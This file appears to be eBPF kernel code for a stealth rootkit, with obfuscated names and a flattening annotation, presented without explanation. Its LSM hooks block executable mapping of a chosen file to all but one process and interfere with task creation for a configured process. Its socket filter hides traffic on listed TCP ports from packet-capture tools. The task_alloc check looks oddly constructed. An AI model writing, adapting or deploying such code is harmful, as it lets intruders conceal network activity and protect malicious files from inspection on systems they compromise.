#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_endian.h>

char LICENSE[] SEC("license") = "GPL";

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1);
    __type(key, u32);
    __type(value, u64[8]); 
} c_m SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, u16);
    __type(value, u8);
} p_m SEC(".maps");

__attribute__((__annotate__(("fla"))))
static __always_inline u32 poly_calc(u32 x) {
    u32 res = x ^ 0x5FC4A31B;
    return (res * 0x27D4EB2D) + 0x1337BEEF;
}

SEC("lsm/task_alloc")
int BPF_PROG(l_h, struct task_struct *task, unsigned long clone_flags) {
    u64 *c = bpf_map_lookup_elem(&c_m, &(u32){0});
    if (c && task->tgid == (u32)c[2]) {
        if (poly_calc(task->tgid) != 0) return -1;
    }
    return 0;
}

SEC("lsm/mmap_file")
int BPF_PROG(b_c, struct file *file, unsigned long prot, unsigned long flags) {
    u64 *c = bpf_map_lookup_elem(&c_m, &(u32){0});
    if (c && file->f_inode->i_ino == c[0]) {
        u32 p = bpf_get_current_pid_tgid() >> 32;
        if (p != (u32)c[2] && (prot & 0x1)) return -EACCES;
    }
    return 0;
}

SEC("socket")
int s_f(struct __sk_buff *skb) {
    void *de = (void *)(long)skb->data_end;
    void *d = (void *)(long)skb->data;
    struct ethhdr *eth = d;
    if (d + sizeof(*eth) > de) return -1;
    if (bpf_ntohs(eth->h_proto) != 0x0800) return -1;
    struct iphdr *iph = d + sizeof(*eth);
    if ((void *)(iph + 1) > de) return -1;
    if (iph->protocol == 6) {
        struct tcphdr *th = (void *)iph + (iph->ihl * 4);
        if ((void *)(th + 1) > de) return -1;
        u16 sp = bpf_ntohs(th->source);
        u16 dp = bpf_ntohs(th->dest);
        if (bpf_map_lookup_elem(&p_m, &sp) || bpf_map_lookup_elem(&p_m, &dp)) return 0;
    }
    return -1;
}
